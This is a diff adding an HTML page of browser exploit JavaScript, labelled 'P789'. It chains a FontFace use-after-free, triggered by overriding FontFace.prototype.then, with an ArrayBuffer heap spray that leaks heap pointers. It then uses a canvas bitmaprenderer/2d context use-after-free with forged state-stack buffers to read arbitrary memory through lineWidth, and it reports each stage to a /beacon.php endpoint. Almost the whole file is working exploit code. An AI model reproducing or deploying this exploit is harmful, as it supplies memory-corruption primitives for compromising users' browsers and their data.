@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P789 — Unloaded Font Oracle & Canvas UAF Read Diagnostic</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; line-height: 1.5; }
+  h2 { color: #58a6ff; margin-top: 0; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
+</style>
+<script>
+'use strict';
+window.onerror = function(msg, url, line, col, err){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P789-ERR&data=' + encodeURIComponent((msg || '') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P789-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+}
+
+var OUT = null;
+function log(s){
+  if (!OUT) OUT = document.getElementById('out');
+  if (OUT) OUT.textContent += s + '\n';
+}
+
+function run(){
+  OUT = document.getElementById('out');
+  log('=== P789 Unloaded Font Oracle & Direct Read Diagnostic ===\n');
+  b('BOOT', 'start');
+
+  // Test 1: Unloaded Font Oracle Verification
+  testUnloadedOracle();
+
+  // Test 2: Baseline Leak & Canvas StateStack Direct Read
+  setTimeout(testCanvasDirectRead, 100);
+}
+
+/* =========================================================================
+   Part 1: Unloaded Font Oracle Verification
+   ========================================================================= */
+function testUnloadedOracle(){
+  log('[Part 1] Testing Unloaded Font Oracle Behavior...');
+
+  // Create local FontFace without calling .load() -> status remains 'unloaded'
+  var unlFace = new FontFace('unlFam', 'local(Arial)', { unicodeRange: 'U+0042' }); // covers 'B'
+  document.fonts.add(unlFace);
+
+  var status = unlFace.status;
+  var chkA = document.fonts.check('1em unlFam', 'A'); // out of range
+  var chkB = document.fonts.check('1em unlFam', 'B'); // in range (U+0042)
+  var chkSpace = document.fonts.check('1em unlFam', ' ');
+
+  b('P1-UNLOADED', 'status=' + status + '|chkA_out=' + chkA + '|chkB_in=' + chkB + '|chkSpace=' + chkSpace);
+  log('Unloaded Font status = ' + status);
+  log('  fonts.check(unlFam, "A") [out-of-range]: ' + chkA + ' (expected: true)');
+  log('  fonts.check(unlFam, "B") [in-range]: ' + chkB + ' (if false -> UNLOADED ORACLE CONFIRMED!)');
+}
+
+/* =========================================================================
+   Part 2: Baseline FontFace Leak + Canvas UAF Direct Read
+   ========================================================================= */
+function testCanvasDirectRead(){
+  log('\n[Part 2] Baseline FontFace UAF Leak...');
+  b('P2-LEAK-START', '');
+
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:cssFam;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var faceTrig = new FontFace('jsTrig', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(faceTrig);
+  void faceTrig.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+
+      if (st){ st.remove(); st.textContent = ''; st = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+
+      for (var k = 0; k < 64; k++) abs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em cssFam'); } catch(e){}
+      document.body.offsetHeight;
+
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em jsTrig, cssFam', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < abs.length; i++){
+      var u = new Uint8Array(abs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if (best < 0 || bestNz < 4){
+      b('P2-LEAK-MISS', 'bestNz=' + bestNz);
+      log('Leak Miss: bestNz=' + bestNz);
+      return;
+    }
+
+    var v64 = new BigUint64Array(abs[best]);
+    var P58 = v64[11]; // live FastMalloc pointer
+    var P68 = v64[13];
+    b('P2-LEAK-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|k=' + best);
+    log('Leak OK: p58=0x' + h16(P58) + ' p68=0x' + h16(P68));
+
+    // Now test Canvas UAF Direct Read
+    log('\n[Part 3] Testing Canvas UAF Direct Read...');
+    executeCanvasUAFRead(P58, P68);
+  }, 250);
+}
+
+function f64bits(v){
+  return new BigUint64Array(new Float64Array([v]).buffer)[0];
+}
+
+function executeCanvasUAFRead(p58, p68){
+  b('P3-CANVAS-START', 'p58=0x' + h16(p58));
+
+  var innerCtx = null;
+  var canvas = document.createElement('canvas');
+  canvas.width = 1;
+  canvas.height = 1;
+
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function(){
+      innerCtx = canvas.getContext('2d');
+      return true;
+    }
+  });
+
+  // Trigger Context UAF via bitmaprenderer / 2d collision
+  canvas.getContext('bitmaprenderer', opts);
+
+  if (!innerCtx){
+    b('P3-CANVAS-FAIL', 'no-inner-ctx');
+    log('Failed: no innerCtx');
+    return;
+  }
+  b('P3-CANVAS-UAF', 'ctx-captured');
+  log('Canvas Context UAF triggered!');
+
+  // Spray ArrayBuffer(768) to reclaim the freed CanvasRenderingContext2D slot
+  var abs768 = [];
+  for (var i = 0; i < 400; i++) abs768.push(new ArrayBuffer(768));
+
+  // Forge m_stateStack.m_buffer at offset 112 (index 14)
+  // Target: read p58 (so target = p58 - 48n)
+  var target = p58 - 48n;
+  for (var j = 0; j < abs768.length; j++){
+    var bv = new BigUint64Array(abs768[j]);
+    var u32 = new Uint32Array(abs768[j]);
+    bv[14] = target;
+    u32[30] = 1; // capacity = 1
+    u32[31] = 1; // size = 1
+  }
+
+  b('P3-FORGED', 'target=0x' + h16(target));
+  log('Forged 400 buffers: target=0x' + h16(target));
+
+  // Read lineWidth
+  var lw = null, err = null;
+  try {
+    lw = innerCtx.lineWidth;
+  } catch(e){
+    err = e.name + ':' + e.message;
+  }
+
+  if (err){
+    b('P3-READ-ERR', err);
+    log('Read error: ' + err);
+    return;
+  }
+
+  var bits = f64bits(lw);
+  b('P3-READ-OK', 'lw=' + lw + '|bits=0x' + h16(bits));
+  log('Read OK: lineWidth = ' + lw);
+  log('Raw Bits = 0x' + h16(bits));
+
+  // Verify against leaked pointers
+  var matchesP58 = (bits === p58);
+  var matchesP68 = (bits === p68);
+  var isHeap = (bits >= 0x1000000000n && bits < 0x8000000000n);
+  b('P3-VERDICT', 'isHeap=' + isHeap + '|matchesP58=' + matchesP58 + '|matchesP68=' + matchesP68);
+  log('Verdict: isHeap=' + isHeap + ' matchesP58=' + matchesP58);
+
+  b('DONE', 'all-tests-complete');
+  log('\n=== P789 COMPLETE ===');
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
+  setTimeout(run, 0);
+} else {
+  document.addEventListener('DOMContentLoaded', run);
+}
+</script>
+</head>
+<body>
+  <h2>P789 — Unloaded Font Oracle & Canvas UAF Read Diagnostic</h2>
+  <div id="status" class="status">Running probe...</div>
+  <pre id="out"></pre>
+</body>
+</html>
